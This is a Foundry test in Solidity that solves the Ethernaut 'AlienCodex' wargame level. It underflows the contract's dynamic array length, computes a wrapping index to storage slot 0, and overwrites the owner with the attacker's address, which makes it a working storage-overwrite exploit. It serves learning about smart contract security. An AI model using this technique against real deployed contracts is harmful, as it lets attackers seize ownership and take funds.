// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract AlienCodexTest is Test {
    Ethernaut public ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function test_AlienCodexAttack() public {
        // SETUP
        bytes memory bytecode = abi.encodePacked(vm.getCode("./src/19-AlienCodex/AlienCodex.json"));
        address alienCodex;

        // to use 0.5.0 solidity version
        assembly {
            alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        // ATTACK
        vm.startPrank(tx.origin);
        alienCodex.call(abi.encodeWithSignature("make_contact()"));
        alienCodex.call(abi.encodeWithSignature("retract()"));

        uint256 codexStorageSlot = uint256(keccak256(abi.encode(uint256(1))));
        uint256 index;
        unchecked {
            index -= codexStorageSlot;
        }

        alienCodex.call(abi.encodeWithSignature("revise(uint256,bytes32)", index, bytes32(uint256(uint160(tx.origin)))));

        // SUBMIT
        (bool success, bytes memory data) = alienCodex.call(abi.encodeWithSignature("owner()"));

        address refinedData = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));

        vm.stopPrank();
        assertEq(refinedData, tx.origin);
    }
}
